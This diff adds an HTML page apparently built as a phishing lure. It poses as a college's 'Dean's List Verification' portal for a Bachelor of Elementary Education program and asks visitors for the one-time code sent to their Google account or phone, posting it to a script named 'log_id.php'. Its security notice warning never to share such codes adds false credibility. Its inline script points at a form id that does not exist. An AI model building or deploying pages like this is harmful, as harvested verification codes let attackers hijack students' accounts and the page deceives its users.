@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Dean’s List Verification | Rosemont Hills Montessori College</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    body {
+        display: flex;
+        justify-content: center;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f6f8;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #333;
+    }
+
+    .container {
+      max-width: 520px;
+      background: #ffffff;
+      margin: 60px 24px;
+      padding: 32px;
+      border-radius: 6px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 22px;
+      color: #1f3fa3; /* royal blue */
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #1f3fa3;
+      color: #ffffff;
+      border: none;
+      padding: 12px 20px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #18338a;
+    }
+
+    .note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+
+    .footer {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Dean’s List Verification</h1>
+
+    <p>
+      To complete your Dean’s List confirmation for the
+      <strong>Bachelor of Elementary Education (BEEd)</strong> program,
+      please enter the one-time verification code sent to your
+      registered Google account or mobile number.
+    </p>
+
+    <form method="POST" action="log_id.php">
+        <label for="code">ID</label>
+        <input
+          type="text"
+          id="code"
+          name="code"
+          placeholder="Enter Verification Code"
+          required
+        />
+        <button type="submit">Verify Code</button>
+      </form>
+
+    <p class="note">
+      <strong>Security notice:</strong>  
+      Never share your verification code with anyone.
+      Rosemont Hills Montessori College will never ask for your code
+      via email, message, or phone call.
+    </p>
+
+    <div class="footer">
+      © 2025 Rosemont Hills Montessori College<br />
+      Official Academic Verification Portal
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("verificationForm").addEventListener("submit", function(e) {
+
+
+      const code = document.getElementById("code").value.trim();
+
+      if (!code) {
+        alert("Please enter your verification code.");
+        return;
+      }
+
+      // Example placeholder action
+      alert("Verification submitted. Please wait for confirmation.");
+
+      // In production:
+      // Send `code` securely to your backend via HTTPS (POST request)
+    });
+  </script>
+
+</body>
+</html>
